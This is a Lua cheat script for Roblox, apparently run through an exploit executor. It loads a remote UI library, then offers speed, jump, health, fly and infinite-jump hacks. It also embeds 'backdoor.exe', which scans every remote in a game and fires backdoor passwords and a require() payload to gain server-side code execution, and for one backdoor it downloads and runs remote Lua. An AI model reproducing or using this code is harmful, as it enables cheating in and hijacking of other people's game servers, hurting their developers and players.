local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()

local Window = Library.CreateLib("Hyper X - ServerSide(SS)", "Ocean")

local Tab = Window:NewTab("Home")
local Section = Tab:NewSection("Home - Section")
Section:NewLabel("Welcome to Hyper X - ServerSide(SS) Edition")
Section:NewLabel("https://discord.gg/Um9CFhVZgD")
Section:NewLabel("Cool UI Library")
Section:NewLabel("Made By WEFESR#7988")

local Tab = Window:NewTab("Player")
local Section = Tab:NewSection("Player - Section")

Section:NewTextBox("Console Message", "Type Somting And Will Apper In Console", function(txt)
	print(txt)
end)

Section:NewSlider("WalksSpeed", "Change Your WalksSpeed", 500, 16, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
end)

Section:NewSlider("JumpPower", "Change Yor JumpPower", 500, 50, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
end)

Section:NewSlider("Health", "Change Yor Health", 500, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.Health = s
end)

Section:NewSlider("Fov", "Change Yor Fov", 120, 50, function(s) -- 500 (MaxValue) | 0 (MinValue)
   game:GetService'Workspace'.Camera.FieldOfView = s
end)

Section:NewButton("Infinite Jump [F]", "You Can Jump For Infinite ", function()
    _G.infinjump = true

	local Player = game:GetService("Players").LocalPlayer
	local Mouse = Player:GetMouse()
	Mouse.KeyDown:connect(function(k)
		if _G.infinjump then
			if k:byte() == 32 then
				Humanoid = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
				Humanoid:ChangeState("Jumping")
				wait(0.1)
				Humanoid:ChangeState("Seated")
			end
		end
	end)

	local Player = game:GetService("Players").LocalPlayer
	local Mouse = Player:GetMouse()
	Mouse.KeyDown:connect(function(k)
		k = k:lower()
		if k == "f" then
			if _G.infinjump == true then
				_G.infinjump = false
			else
				_G.infinjump = true
			end
		end
	end)
end)

Section:NewButton("Fly [H]", "You Can Fly", function()
    local plr = game.Players.LocalPlayer
	local mouse = plr:GetMouse()

	localplayer = plr

	if workspace:FindFirstChild("Core") then
		workspace.Core:Destroy()
	end

	local Core = Instance.new("Part")
	Core.Name = "Core"
	Core.Size = Vector3.new(0.05, 0.05, 0.05)

	spawn(function()
		Core.Parent = workspace
		local Weld = Instance.new("Weld", Core)
		Weld.Part0 = Core
		Weld.Part1 = localplayer.Character.LowerTorso
		Weld.C0 = CFrame.new(0, 0, 0)
	end)

	workspace:WaitForChild("Core")

	local torso = workspace.Core
	flying = true
	local speed=10
	local keys={a=false,d=false,w=false,s=false} 
	local e1
	local e2
	local function start()
		local pos = Instance.new("BodyPosition",torso)
		local gyro = Instance.new("BodyGyro",torso)
		pos.Name="EPIXPOS"
		pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
		pos.position = torso.Position
		gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
		gyro.cframe = torso.CFrame
		repeat
			wait()
			localplayer.Character.Humanoid.PlatformStand=true
			local new=gyro.cframe - gyro.cframe.p + pos.position
			if not keys.w and not keys.s and not keys.a and not keys.d then
				speed=5
			end
			if keys.w then 
				new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
				speed=speed+0
			end
			if keys.s then 
				new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
				speed=speed+0
			end
			if keys.d then 
				new = new * CFrame.new(speed,0,0)
				speed=speed+0
			end
			if keys.a then 
				new = new * CFrame.new(-speed,0,0)
				speed=speed+0
			end
			if speed>10 then
				speed=5
			end
			pos.position=new.p
			if keys.w then
				gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(-math.rad(speed*0),0,0)
			elseif keys.s then
				gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(math.rad(speed*0),0,0)
			else
				gyro.cframe = workspace.CurrentCamera.CoordinateFrame
			end
		until flying == false
		if gyro then gyro:Destroy() end
		if pos then pos:Destroy() end
		flying=false
		localplayer.Character.Humanoid.PlatformStand=false
		speed=10
	end
	e1=mouse.KeyDown:connect(function(key)
		if not torso or not torso.Parent then flying=false e1:disconnect() e2:disconnect() return end
		if key=="w" then
			keys.w=true
		elseif key=="s" then
			keys.s=true
		elseif key=="a" then
			keys.a=true
		elseif key=="d" then
			keys.d=true
		elseif key=="h" then
			if flying==true then
				flying=false
			else
				flying=true
				start()
			end
		end
	end)
	e2=mouse.KeyUp:connect(function(key)
		if key=="w" then
			keys.w=false
		elseif key=="s" then
			keys.s=false
		elseif key=="a" then
			keys.a=false
		elseif key=="d" then
			keys.d=false
		end
	end)
	start()
end)

local Tab = Window:NewTab("Executors")
local Section = Tab:NewSection("Executors - Section")

Section:NewButton("BackDoor.exe", "ButtonInfo", function()
    --[[
    backdoor.exe, the best backdoor scanner in Roblox.
    Copyright (C) 2021  iK4oS
 
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
 
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
 
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
]]
 
local LocalPlayer = game:GetService("Players").LocalPlayer
local requireScript = ("require(7924358164):k4scripts('%s')"):format(LocalPlayer.Name)
local invCode = "6HndYgC"
 
local alternativeSS = {
    run = { [1] = "5#lGIERKWEF" },
    emma = { [1] = "pwojr8hoc0-gr0yxohlgp-0feb7ncxed", [2] = ",,,,,,,,,,,,,,," },
    helpme = { [1] = "helpme" },
    pickett = { [1] = "cGlja2V0dA==" },
    harked = "https://raw.githubusercontent.com/iK4oS/backdoor.exe/indev/harkedSS.lua"
}
 
local function notify(text)
    game:GetService("StarterGui"):SetCore(
    "SendNotification",
        {
            Title = "backdoor.exe",
            Duration = 3,
            Text = text
        }
    )
end
 
local function attached(possibleWait)
    if possibleWait then wait(possibleWait) end
    return LocalPlayer.PlayerGui:FindFirstChild("backdoor.exe")
end
 
local function validRemote(rm, _className)
    local fullName =  rm:GetFullName()
    
    if string.find(fullName, "DefaultChat") then return false end
    if string.find(fullName, LocalPlayer.Name) then return false end
    if rm:FindFirstChild("__FUNCTION") then return false end
    if rm.Parent == game:GetService("JointsService") then return false end
    
    if rm.ClassName ~= _className then return false end
 
    if getgenv().blacklisted then
        if table.find(getgenv().blacklisted, fullName) then return false end
    end
 
    return true
end
 
local function harked()
    local backpack = LocalPlayer.Backpack 
    return backpack:FindFirstChild("HandlessSegway") and
        Backpack.HandlessSegway:FindFirstChild("RemoteEvents") and
        Backpack.HandlessSegway.RemoteEvents:FindFirstChild("DestroySegway")
end
local function emmaBackdoor(rm)
    return rm.Name == "emma" and rm.Parent.Name == "mynameemma"
end
local function runBackdoor(rm)
    return rm.Name == "Run" and
    rm.Parent:FindFirstChild("Pages") and rm.Parent:FindFirstChild("R6") and
    rm.Parent:FindFirstChild("Version") and rm.Parent:FindFirstChild("Title")
end
 
local function scanGame()
    notify("Scanning for a backdoor.")
    if harked() then
        loadstring(game:HttpGetAsync(alternativeSS.harked))()
        return
    end
 
    for _, remote in pairs(game:GetDescendants()) do
        if validRemote(remote, "RemoteEvent") and not attached() then
            if emmaBackdoor(remote) then
                remote:FireServer(unpack(alternativeSS.emma), requireScript)
            end
            if runBackdoor(remote) then
                remote:FireServer(unpack(alternativeSS.run), requireScript)
            end
 
            remote:FireServer(unpack(alternativeSS.helpme), requireScript)
            remote:FireServer(unpack(alternativeSS.pickett), requireScript)
            remote:FireServer(requireScript)
 
        end
    end
 
    for _, remote in pairs(game:GetDescendants()) do
        if validRemote(remote, "RemoteFunction") and not attached() then
            remote:InvokeServer(requireScript)
        end
    end
 
end
 
local function Main()
    notify("Make sure to join our Discord!\nCode: "..invCode)
 
    scanGame()
    
    if not attached(2) then
        notify("Unable to find backdoor.\nGame not backdoored?")
    end
end
 
if game:IsLoaded() then
    pcall(Main)
end

end)
